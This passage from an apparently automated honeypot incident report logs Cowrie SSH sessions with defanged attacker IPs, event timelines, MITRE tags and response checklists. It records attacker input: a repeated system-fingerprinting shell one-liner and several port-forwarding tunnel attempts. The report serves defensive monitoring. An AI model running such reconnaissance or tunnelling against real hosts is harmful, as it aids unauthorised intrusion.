- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc30cdde04bb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:58 |
| **Last Seen** | 2026-07-10 11:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:58:23` | `cowrie.session.connect` |
| `2026-07-10 11:58:23` | `cowrie.client.version` |
| `2026-07-10 11:58:23` | `cowrie.client.kex` |
| `2026-07-10 11:58:24` | `cowrie.login.success` |
| `2026-07-10 11:58:25` | `cowrie.session.params` |
| `2026-07-10 11:58:25` | `cowrie.command.input` |
| `2026-07-10 11:58:25` | `cowrie.command.input` |
| `2026-07-10 11:58:25` | `cowrie.command.input` |
| `2026-07-10 11:58:25` | `cowrie.command.input` |
| `2026-07-10 11:58:25` | `cowrie.command.input` |
| `2026-07-10 11:58:25` | `cowrie.command.success` |
| `2026-07-10 11:58:25` | `cowrie.command.input` |
| `2026-07-10 11:58:25` | `cowrie.command.input` |
| `2026-07-10 11:58:25` | `cowrie.command.input` |
| `2026-07-10 11:58:25` | `cowrie.command.input` |
| `2026-07-10 11:58:25` | `cowrie.log.closed` |
| `2026-07-10 11:58:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7ae49bf4c79

| Field | Detail |
|---|---|
| **Source IP** | `211.114.40[.]60` |
| **First Seen** | 2026-07-10 11:58 |
| **Last Seen** | 2026-07-10 11:59 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:58:59` | `cowrie.session.connect` |
| `2026-07-10 11:59:00` | `cowrie.client.version` |
| `2026-07-10 11:59:00` | `cowrie.client.kex` |
| `2026-07-10 11:59:03` | `cowrie.login.success` |
| `2026-07-10 11:59:04` | `cowrie.direct-tcpip.request` |
| `2026-07-10 11:59:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.114.40[.]60` to AbuseIPDB if not already reported
- [ ] Block `211.114.40[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a15f677e5627

| Field | Detail |
|---|---|
| **Source IP** | `91.144.158[.]62` |
| **First Seen** | 2026-07-10 11:59 |
| **Last Seen** | 2026-07-10 11:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:59:14` | `cowrie.session.connect` |
| `2026-07-10 11:59:14` | `cowrie.client.version` |
| `2026-07-10 11:59:14` | `cowrie.client.kex` |
| `2026-07-10 11:59:16` | `cowrie.login.success` |
| `2026-07-10 11:59:16` | `cowrie.direct-tcpip.request` |
| `2026-07-10 11:59:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.144.158[.]62` to AbuseIPDB if not already reported
- [ ] Block `91.144.158[.]62` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85858827d987

| Field | Detail |
|---|---|
| **Source IP** | `60.174.39[.]82` |
| **First Seen** | 2026-07-10 11:59 |
| **Last Seen** | 2026-07-10 11:59 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:59:25` | `cowrie.session.connect` |
| `2026-07-10 11:59:25` | `cowrie.client.version` |
| `2026-07-10 11:59:25` | `cowrie.client.kex` |
| `2026-07-10 11:59:28` | `cowrie.login.success` |
| `2026-07-10 11:59:30` | `cowrie.direct-tcpip.request` |
| `2026-07-10 11:59:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.174.39[.]82` to AbuseIPDB if not already reported
- [ ] Block `60.174.39[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0db08c631a22

| Field | Detail |
|---|---|
| **Source IP** | `65.20.204[.]41` |
| **First Seen** | 2026-07-10 11:59 |
| **Last Seen** | 2026-07-10 11:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:59:39` | `cowrie.session.connect` |
| `2026-07-10 11:59:40` | `cowrie.client.version` |
| `2026-07-10 11:59:40` | `cowrie.client.kex` |
| `2026-07-10 11:59:41` | `cowrie.login.success` |
| `2026-07-10 11:59:41` | `cowrie.direct-tcpip.request` |
| `2026-07-10 11:59:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.204[.]41` to AbuseIPDB if not already reported
- [ ] Block `65.20.204[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3647e104fc13

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:59 |
| **Last Seen** | 2026-07-10 11:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:59:45` | `cowrie.session.connect` |
| `2026-07-10 11:59:45` | `cowrie.client.version` |
| `2026-07-10 11:59:45` | `cowrie.client.kex` |
| `2026-07-10 11:59:46` | `cowrie.login.success` |
| `2026-07-10 11:59:47` | `cowrie.session.params` |
| `2026-07-10 11:59:47` | `cowrie.command.input` |
| `2026-07-10 11:59:47` | `cowrie.command.input` |
| `2026-07-10 11:59:47` | `cowrie.command.input` |
| `2026-07-10 11:59:47` | `cowrie.command.input` |
| `2026-07-10 11:59:47` | `cowrie.command.input` |
| `2026-07-10 11:59:47` | `cowrie.command.success` |
| `2026-07-10 11:59:47` | `cowrie.command.input` |
| `2026-07-10 11:59:47` | `cowrie.command.input` |
| `2026-07-10 11:59:47` | `cowrie.command.input` |
| `2026-07-10 11:59:47` | `cowrie.command.input` |
| `2026-07-10 11:59:47` | `cowrie.log.closed` |
| `2026-07-10 11:59:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ece3cabff1f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:00 |
| **Last Seen** | 2026-07-10 12:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:00:58` | `cowrie.session.connect` |
| `2026-07-10 12:00:59` | `cowrie.client.version` |
| `2026-07-10 12:00:59` | `cowrie.client.kex` |
| `2026-07-10 12:01:00` | `cowrie.login.success` |
| `2026-07-10 12:01:01` | `cowrie.session.params` |
| `2026-07-10 12:01:01` | `cowrie.command.input` |
| `2026-07-10 12:01:01` | `cowrie.command.input` |
| `2026-07-10 12:01:01` | `cowrie.command.input` |
| `2026-07-10 12:01:01` | `cowrie.command.input` |
| `2026-07-10 12:01:01` | `cowrie.command.input` |
| `2026-07-10 12:01:01` | `cowrie.command.success` |
| `2026-07-10 12:01:01` | `cowrie.command.input` |
| `2026-07-10 12:01:01` | `cowrie.command.input` |
| `2026-07-10 12:01:01` | `cowrie.command.input` |
| `2026-07-10 12:01:01` | `cowrie.command.input` |
| `2026-07-10 12:01:02` | `cowrie.log.closed` |
| `2026-07-10 12:01:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50b0d2367efd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:02 |
| **Last Seen** | 2026-07-10 12:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:02:11` | `cowrie.session.connect` |
| `2026-07-10 12:02:11` | `cowrie.client.version` |
| `2026-07-10 12:02:11` | `cowrie.client.kex` |
| `2026-07-10 12:02:12` | `cowrie.login.success` |
| `2026-07-10 12:02:13` | `cowrie.session.params` |
| `2026-07-10 12:02:13` | `cowrie.command.input` |
| `2026-07-10 12:02:13` | `cowrie.command.input` |
| `2026-07-10 12:02:13` | `cowrie.command.input` |
| `2026-07-10 12:02:13` | `cowrie.command.input` |
| `2026-07-10 12:02:13` | `cowrie.command.input` |
| `2026-07-10 12:02:13` | `cowrie.command.success` |
| `2026-07-10 12:02:13` | `cowrie.command.input` |
| `2026-07-10 12:02:13` | `cowrie.command.input` |
| `2026-07-10 12:02:13` | `cowrie.command.input` |
| `2026-07-10 12:02:13` | `cowrie.command.input` |
| `2026-07-10 12:02:13` | `cowrie.log.closed` |
| `2026-07-10 12:02:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd8773db59b8

| Field | Detail |
|---|---|
| **Source IP** | `223.107.72[.]234` |
| **First Seen** | 2026-07-10 12:02 |
| **Last Seen** | 2026-07-10 12:02 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:02:21` | `cowrie.session.connect` |
| `2026-07-10 12:02:22` | `cowrie.client.version` |
| `2026-07-10 12:02:22` | `cowrie.client.kex` |
| `2026-07-10 12:02:25` | `cowrie.login.success` |
| `2026-07-10 12:02:26` | `cowrie.direct-tcpip.request` |
| `2026-07-10 12:02:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.107.72[.]234` to AbuseIPDB if not already reported
- [ ] Block `223.107.72[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-872478bffa24

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:03 |
| **Last Seen** | 2026-07-10 12:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:03:25` | `cowrie.session.connect` |
| `2026-07-10 12:03:25` | `cowrie.client.version` |
| `2026-07-10 12:03:25` | `cowrie.client.kex` |
| `2026-07-10 12:03:27` | `cowrie.login.success` |
| `2026-07-10 12:03:28` | `cowrie.session.params` |
| `2026-07-10 12:03:28` | `cowrie.command.input` |
| `2026-07-10 12:03:28` | `cowrie.command.input` |
| `2026-07-10 12:03:28` | `cowrie.command.input` |
| `2026-07-10 12:03:28` | `cowrie.command.input` |
| `2026-07-10 12:03:28` | `cowrie.command.input` |
| `2026-07-10 12:03:28` | `cowrie.command.success` |
| `2026-07-10 12:03:28` | `cowrie.command.input` |
| `2026-07-10 12:03:28` | `cowrie.command.input` |
| `2026-07-10 12:03:28` | `cowrie.command.input` |
| `2026-07-10 12:03:28` | `cowrie.command.input` |
| `2026-07-10 12:03:28` | `cowrie.log.closed` |
| `2026-07-10 12:03:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9820d96594f5

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-10 12:03 |
| **Last Seen** | 2026-07-10 12:03 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:03:33` | `cowrie.session.connect` |
| `2026-07-10 12:03:34` | `cowrie.client.version` |
| `2026-07-10 12:03:34` | `cowrie.client.kex` |
| `2026-07-10 12:03:39` | `cowrie.login.success` |
| `2026-07-10 12:03:44` | `cowrie.session.params` |
| `2026-07-10 12:03:44` | `cowrie.command.input` |
| `2026-07-10 12:03:45` | `cowrie.log.closed` |
| `2026-07-10 12:03:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf975e4ede0d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:04 |
| **Last Seen** | 2026-07-10 12:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:04:44` | `cowrie.session.connect` |
| `2026-07-10 12:04:44` | `cowrie.client.version` |
| `2026-07-10 12:04:44` | `cowrie.client.kex` |
| `2026-07-10 12:04:45` | `cowrie.login.success` |
| `2026-07-10 12:04:46` | `cowrie.session.params` |
| `2026-07-10 12:04:46` | `cowrie.command.input` |
| `2026-07-10 12:04:46` | `cowrie.command.input` |
| `2026-07-10 12:04:46` | `cowrie.command.input` |
| `2026-07-10 12:04:46` | `cowrie.command.input` |
| `2026-07-10 12:04:46` | `cowrie.command.input` |
| `2026-07-10 12:04:46` | `cowrie.command.success` |
| `2026-07-10 12:04:46` | `cowrie.command.input` |
| `2026-07-10 12:04:46` | `cowrie.command.input` |
| `2026-07-10 12:04:46` | `cowrie.command.input` |
| `2026-07-10 12:04:46` | `cowrie.command.input` |
| `2026-07-10 12:04:46` | `cowrie.log.closed` |
| `2026-07-10 12:04:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7de98448cd85

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:06 |
| **Last Seen** | 2026-07-10 12:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:06:02` | `cowrie.session.connect` |
| `2026-07-10 12:06:02` | `cowrie.client.version` |
| `2026-07-10 12:06:02` | `cowrie.client.kex` |
| `2026-07-10 12:06:03` | `cowrie.login.success` |
| `2026-07-10 12:06:05` | `cowrie.session.params` |
| `2026-07-10 12:06:05` | `cowrie.command.input` |
| `2026-07-10 12:06:05` | `cowrie.command.input` |
| `2026-07-10 12:06:05` | `cowrie.command.input` |
| `2026-07-10 12:06:05` | `cowrie.command.input` |
| `2026-07-10 12:06:05` | `cowrie.command.input` |
| `2026-07-10 12:06:05` | `cowrie.command.success` |
| `2026-07-10 12:06:05` | `cowrie.command.input` |
| `2026-07-10 12:06:05` | `cowrie.command.input` |
| `2026-07-10 12:06:05` | `cowrie.command.input` |
| `2026-07-10 12:06:05` | `cowrie.command.input` |
| `2026-07-10 12:06:05` | `cowrie.log.closed` |
| `2026-07-10 12:06:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22074f9dab73

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:07 |
| **Last Seen** | 2026-07-10 12:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:07:20` | `cowrie.session.connect` |
| `2026-07-10 12:07:20` | `cowrie.client.version` |
| `2026-07-10 12:07:20` | `cowrie.client.kex` |
| `2026-07-10 12:07:21` | `cowrie.login.success` |
| `2026-07-10 12:07:22` | `cowrie.session.params` |
| `2026-07-10 12:07:22` | `cowrie.command.input` |
| `2026-07-10 12:07:22` | `cowrie.command.input` |
| `2026-07-10 12:07:22` | `cowrie.command.input` |
| `2026-07-10 12:07:22` | `cowrie.command.input` |
| `2026-07-10 12:07:22` | `cowrie.command.input` |
| `2026-07-10 12:07:22` | `cowrie.command.success` |
| `2026-07-10 12:07:22` | `cowrie.command.input` |
| `2026-07-10 12:07:22` | `cowrie.command.input` |
| `2026-07-10 12:07:22` | `cowrie.command.input` |
| `2026-07-10 12:07:22` | `cowrie.command.input` |
| `2026-07-10 12:07:22` | `cowrie.log.closed` |
| `2026-07-10 12:07:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd9d21ff9d9c

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-10 12:07 |
| **Last Seen** | 2026-07-10 12:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:07:23` | `cowrie.session.connect` |
| `2026-07-10 12:07:23` | `cowrie.client.version` |
| `2026-07-10 12:07:23` | `cowrie.client.kex` |
| `2026-07-10 12:07:23` | `cowrie.login.success` |
| `2026-07-10 12:07:24` | `cowrie.direct-tcpip.request` |
| `2026-07-10 12:07:24` | `cowrie.direct-tcpip.data` |
| `2026-07-10 12:07:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19c6cca61e86

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:08 |
| **Last Seen** | 2026-07-10 12:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:08:36` | `cowrie.session.connect` |
| `2026-07-10 12:08:36` | `cowrie.client.version` |
| `2026-07-10 12:08:36` | `cowrie.client.kex` |
| `2026-07-10 12:08:37` | `cowrie.login.success` |
| `2026-07-10 12:08:38` | `cowrie.session.params` |
| `2026-07-10 12:08:38` | `cowrie.command.input` |
| `2026-07-10 12:08:38` | `cowrie.command.input` |
| `2026-07-10 12:08:38` | `cowrie.command.input` |
| `2026-07-10 12:08:38` | `cowrie.command.input` |
| `2026-07-10 12:08:38` | `cowrie.command.input` |
